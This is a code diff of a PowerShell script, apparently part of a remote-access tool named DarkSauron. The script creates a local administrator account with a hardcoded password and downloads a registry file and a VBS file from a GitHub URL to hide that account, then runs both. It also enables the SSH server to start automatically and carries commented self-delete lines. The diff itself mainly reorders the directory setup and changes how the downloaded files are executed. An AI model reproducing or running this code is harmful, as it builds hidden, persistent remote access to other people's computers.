@@ -37,6 +37,16 @@ $uname = random_text
 $password = (ConvertTo-SecureString "Rat@@123"-AsPlainText -Force)
 create_account  -uname $uname -password $password
 
+
+
+#goto temp ,make working directory
+
+ mkdir $path 
+ cd $path 
+ 
+
+
+
 #registry  to hide local admin
 $reg_file = random_text
 Invoke-WebRequest  -Uri https://raw.githubusercontent.com/knightcoder77/DarkSauron/main/files/admin.reg -OutFile "$reg_file.reg"
@@ -49,13 +59,9 @@ $vbs_file = random_text
 Invoke-WebRequest  -Uri https://raw.githubusercontent.com/knightcoder77/DarkSauron/main/files/confirm.vbs -OutFile "$vbs_file.vbs"
 
 #install the registry
+./"$reg_file.reg";"$vbs_file.vbs"
 
 
-# For registry file
-Start-Process "reg.exe" -ArgumentList "import `"$reg_file.reg`""
-
-# For VBS file (if you really need it)
-Start-Process "wscript.exe" -ArgumentList "`"$vbs_file.vbs`""
 
 
 
@@ -81,11 +87,6 @@ Set-Service  -Name sshd -StartupType 'Automatic'
 Get-NetFirewallRule -Name *ssh* -Enabled True
 
 
-#goto temp ,make working directory
-
- mkdir $path 
- cd $path 
- 
 
  #self delete
  #cd $initial_dir
